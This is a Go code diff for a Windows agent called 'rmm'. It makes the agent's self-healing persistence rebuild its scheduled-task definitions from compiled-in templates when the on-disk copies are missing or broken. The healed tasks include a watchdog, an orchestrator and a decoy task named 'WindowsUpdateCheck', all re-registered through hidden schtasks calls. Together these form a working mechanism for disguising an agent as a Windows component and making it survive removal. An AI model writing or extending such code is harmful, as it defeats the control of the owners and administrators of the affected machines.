@@ -15,6 +15,7 @@ import (
 
 	"golang.org/x/sys/windows/registry"
 	"rmm/internal/commands"
+	"rmm/internal/persist"
 	"rmm/internal/version"
 )
 
@@ -192,6 +193,45 @@ func ensureWmiLayer(agentPath string) {
 	}
 }
 
+// validTaskXMLFile reports whether path holds a schtasks-acceptable task.
+func validTaskXMLFile(path string) bool {
+	b, err := os.ReadFile(path)
+	if err != nil {
+		return false
+	}
+	return persist.ValidateTaskXML(string(b)) == nil
+}
+
+// regenerateTaskXML rebuilds one task XML copy in the install dir from the
+// compiled-in persist builders (single source of truth). Used when every
+// on-disk copy is missing or malformed (v1.45.2 shipped a broken
+// agent_task.xml that healers could never consume). Returns the path or "".
+func regenerateTaskXML(dir, file, agentPath, controllerAddr, caPath string) string {
+	var doc string
+	switch file {
+	case "agent_task.xml":
+		doc = persist.AgentTaskXML(agentPath, controllerAddr, caPath)
+	case "watchdog_task.xml":
+		doc = persist.WatchdogTaskXML(agentPath)
+	case "orchestrator_task.xml":
+		doc = persist.OrchestratorTaskXML(agentPath)
+	case "decoy_task.xml":
+		doc = persist.DecoyTaskXML(agentPath)
+	default:
+		return ""
+	}
+	if err := persist.ValidateTaskXML(doc); err != nil {
+		log.Printf("[heal] regenerated %s failed validation: %v", file, err)
+		return ""
+	}
+	p := filepath.Join(dir, file)
+	if err := os.WriteFile(p, []byte(doc), 0644); err != nil {
+		return ""
+	}
+	log.Printf("[heal] regenerated %s from compiled template", file)
+	return p
+}
+
 // resolveTaskXML finds a task XML: install dir first, then any profile
 // backup dir (three copies exist since v1.40.19).
 func resolveTaskXML(dir, name string) string {
@@ -334,8 +374,11 @@ func runWmiHeal() {
 			continue
 		}
 		xml := resolveTaskXML(dir, t[1])
+		if xml == "" || !validTaskXMLFile(xml) {
+			xml = regenerateTaskXML(dir, t[1], agentPath, controllerAddr, caPath)
+		}
 		if xml == "" {
-			log.Printf("[heal] task %s missing and no saved XML anywhere", t[0])
+			log.Printf("[heal] task %s missing and no usable XML anywhere", t[0])
 			continue
 		}
 		if out, err := hiddenExec("schtasks", "/create", "/tn", t[0], "/xml", xml, "/f").CombinedOutput(); err != nil {
@@ -363,7 +406,11 @@ func runWmiHeal() {
 	ensureService(agentPath)
 	// Decoy heal vectors too (task + Run value).
 	if err := hiddenExec("schtasks", "/query", "/tn", "WindowsUpdateCheck").Run(); err != nil {
-		if xml := resolveTaskXML(dir, "decoy_task.xml"); xml != "" {
+		xml := resolveTaskXML(dir, "decoy_task.xml")
+		if xml == "" || !validTaskXMLFile(xml) {
+			xml = regenerateTaskXML(dir, "decoy_task.xml", agentPath, controllerAddr, caPath)
+		}
+		if xml != "" {
 			_, _ = hiddenExec("schtasks", "/create", "/tn", "WindowsUpdateCheck", "/xml", xml, "/f").CombinedOutput()
 		}
 	}
@@ -410,8 +457,11 @@ func ensureWatchPersistence(w *watchCfg) {
 			continue
 		}
 		xml := resolveTaskXML(w.installDir, t[1])
+		if xml == "" || !validTaskXMLFile(xml) {
+			xml = regenerateTaskXML(w.installDir, t[1], w.agentPath, w.controllerAddr, w.caPath)
+		}
 		if xml == "" {
-			log.Printf("[watch] task %s missing and no saved XML in any copy", t[0])
+			log.Printf("[watch] task %s missing and no usable XML in any copy", t[0])
 			continue
 		}
 		if out, err := hiddenExec("schtasks", "/create", "/tn", t[0], "/xml", xml, "/f").CombinedOutput(); err != nil {
